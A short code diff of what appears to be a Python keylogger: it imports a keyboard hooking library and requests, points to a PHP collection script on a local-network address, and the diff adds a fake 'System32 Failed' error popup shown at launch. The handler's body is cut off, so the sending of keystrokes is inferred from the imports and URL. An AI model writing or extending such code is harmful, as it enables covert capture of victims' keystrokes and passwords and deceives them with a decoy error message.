@@ -1,8 +1,13 @@
 import keyboard
 import requests
+from tkinter import messagebox
 from urllib.parse import quote
 
-php_script_url = "http://192.168.0.13/index.php"
+php_script_url = "http://192.168.1.56/index.php"
+
+messagebox.showerror('System32 Failed', 'Error System32')
+
+print('Started ...')
 
 def on_key_event(e):
 
